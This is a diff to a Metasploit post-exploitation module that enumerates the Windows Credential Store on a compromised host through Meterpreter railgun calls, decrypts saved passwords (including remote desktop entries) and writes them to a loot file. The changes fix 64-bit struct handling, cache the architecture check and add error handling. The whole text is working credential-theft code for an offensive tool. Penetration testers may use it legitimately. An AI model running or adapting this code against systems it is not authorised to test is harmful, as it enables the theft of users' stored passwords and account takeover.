@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
-
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
 
   def initialize(info={})
     super(update_info(info,
@@ -29,8 +26,12 @@ class Metasploit3 < Msf::Post
   #RAILGUN HELPER FUNCTIONS
   ############################
   def is_86
-    pid = session.sys.process.open.pid
-    return session.sys.process.each_process.find { |i| i["pid"] == pid} ["arch"] == "x86"
+    if @is_86_check.nil?
+      pid = session.sys.process.open.pid
+      @is_86_check = session.sys.process.each_process.find { |i| i["pid"] == pid} ["arch"] == "x86"
+    end
+
+    @is_86_check
   end
 
   def pack_add(data)
@@ -174,15 +175,31 @@ class Metasploit3 < Msf::Post
     credentials = []
     #call credenumerate to get the ptr needed
     adv32 = session.railgun.advapi32
-    ret = adv32.CredEnumerateA(nil,0,4,4)
-    p_to_arr = ret["Credentials"].unpack("V")
-    arr_len = ret["Count"] * 4 if is_86
-    arr_len = ret["Count"] * 8 unless is_86
+    begin
+      ret = adv32.CredEnumerateA(nil,0,4,4)
+    rescue Rex::Post::Meterpreter::RequestError => e
+      print_error("This module requires WinXP or higher")
+      print_error("CredEnumerateA() failed: #{e.class} #{e}")
+      ret = nil
+    end
+    if ret.nil?
+      count = 0
+      arr_len = 0
+    else
+      p_to_arr = ret["Credentials"].unpack("V")
+      if is_86
+        count = ret["Count"]
+        arr_len = count * 4
+      else
+        count = ret["Count"] & 0x00000000ffffffff
+        arr_len = count * 8
+      end
+    end
 
     #tell user what's going on
-    print_status("#{ret["Count"]} credentials found in the Credential Store")
+    print_status("#{count} credentials found in the Credential Store")
     return credentials unless arr_len > 0
-    if ret["Count"] > 0
+    if count > 0
       print_status("Decrypting each set of credentials, this may take a minute...")
 
       #read array of addresses as pointers to each structure
@@ -193,24 +210,29 @@ class Metasploit3 < Msf::Post
       #loop through the addresses and read each credential structure
       pcred_array.each do |pcred|
         cred = {}
-        raw = read_str(pcred, 52,2)
+        if is_86
+          raw = read_str(pcred, 52, 2)
+        else
+          raw = read_str(pcred, 80, 2)
+        end
+
         cred_struct = raw.unpack("VVVVQ<VVVVVVV") if is_86
         cred_struct = raw.unpack("VVQ<Q<Q<Q<Q<VVQ<Q<Q<") unless is_86
         cred["flags"] = cred_struct[0]
         cred["type"] = cred_struct[1]
-        cred["targetname"] = read_str(cred_struct[2],512, 1)
-        cred["comment"] = read_str(cred_struct[3],256, 1)
+        cred["targetname"] = read_str(cred_struct[2], 512, 1)
+        cred["comment"] = read_str(cred_struct[3], 256, 1)
         cred["lastdt"] = cred_struct[4]
         cred["persist"] = cred_struct[7]
         cred["attribcnt"] = cred_struct[8]
         cred["pattrib"] = cred_struct[9]
-        cred["targetalias"] = read_str(cred_struct[10],256, 1)
-        cred["username"] = read_str(cred_struct[11],513, 1)
+        cred["targetalias"] = read_str(cred_struct[10], 256, 1)
+        cred["username"] = read_str(cred_struct[11], 513, 1)
 
-        if cred["targetname"].include? "TERMSRV"
-          cred["password"] = read_str(cred_struct[6],cred_struct[5],0)
+        if cred["targetname"].include?('TERMSRV')
+          cred["password"] = read_str(cred_struct[6], cred_struct[5], 0)
         elsif cred["type"] == 1
-          decrypted = decrypt_blob(cred_struct[6],cred_struct[5], 1)
+          decrypted = decrypt_blob(cred_struct[6], cred_struct[5], 1)
           cred["username"] = decrypted.split(':')[0] || "No Data"
           cred["password"] = decrypted.split(':')[1] || "No Data"
         elsif cred["type"] == 4
@@ -218,6 +240,7 @@ class Metasploit3 < Msf::Post
         else
           cred["password"] = "unsupported type"
         end
+
         #only add to array if there is a target name
         unless cred["targetname"] == "Error Decrypting" or cred["password"] == "unsupported type"
           print_status("Credential sucessfully decrypted for: #{cred["targetname"]}")
@@ -257,7 +280,7 @@ class Metasploit3 < Msf::Post
         creds,
         'credstore_user_creds.txt',
         'Microsoft Credential Store Contents')
-      print_status("Data saved in: #{path}")
+      print_good("Data saved in: #{path}")
     end
   end
 end
